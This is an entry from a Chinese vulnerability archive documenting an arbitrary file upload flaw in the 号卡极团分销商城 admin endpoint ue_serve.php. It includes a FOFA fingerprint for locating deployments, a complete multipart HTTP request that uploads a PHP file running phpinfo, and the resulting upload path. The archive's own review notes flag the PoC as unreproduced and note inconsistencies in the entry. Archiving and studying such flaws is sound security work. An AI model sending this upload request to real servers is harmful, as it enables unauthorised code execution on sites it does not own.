---
source: "wy876 漏洞文库"
title: "号卡极团分销商城 ue_serve image任意后缀上传"
product: "号卡极团分销商城"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；PHP上传目录解析"
prerequisites: "携带PHPSESSID，后台admin路由"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/zl0fb1pz9uc16fmg"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%8D%A1%E5%8F%B7%E6%9E%81%E5%9B%A2%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E5%8D%A1%E5%8F%B7%E6%9E%81%E5%9B%A2%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fue_serve%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "icon_hash=\"-795291075\""
fofa_unverified: "icon_hash="
id: "vw-86c0763b2bc229fb4b3c916e"
entity_id: "ve-86c0763b2bc229fb4b3c916e"
schema_version: "1"
---

# 号卡极团分销商城 ue_serve image任意后缀上传

## 条目说明

- 对象与具体问题：号卡极团分销商城；ue_serve image任意后缀上传
- 版本、配置及部署条件：版本未知；PHP上传目录解析
- 认证与权限前提：携带PHPSESSID，后台admin路由
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 样例身份不明不能当无认证；标题未注明后台条件
- phpinfo为执行检测但未给访问结果，上传路径随机前缀应来自响应
- 未清理PHP文件，产品名卡号/号卡不一致且或服错字
- 补修复/版本/鉴权与目录权限

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
号卡极团分销商城管理系统,同步对接多平台,同步订单信息,支持敢探号一键上架,卡号极团管理系统ue_serve存在任意文件上传漏洞，攻击者可通过该漏洞或服服务器权限。

## 二、影响版本
+ 卡号极团管理系统

## 三、资产测绘
+ fofa`icon_hash="-795291075"`
+ 特征


## 四、漏洞复现
```http
POST /admin/controller/ue_serve.php?action=image&encode=utf-8 HTTP/2
Host: 
Cookie: PHPSESSID=ecq4ucplk5n6e3ipihvktl103r
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylkv1kpsZgzw2WC03
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

------WebKitFormBoundarylkv1kpsZgzw2WC03
Content-Disposition: form-data; name="name"

raw.php
------WebKitFormBoundarylkv1kpsZgzw2WC03
Content-Disposition: form-data; name="upfile"; filename="raw.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundarylkv1kpsZgzw2WC03--
```

> 请求长度说明：原资料 Content-Length 为 301；静态长度已移除，应由客户端根据最终请求体的字节数生成。


上传文件位置

```plain
/upload/660c0ab3990c5_raw.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zl0fb1pz9uc16fmg>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
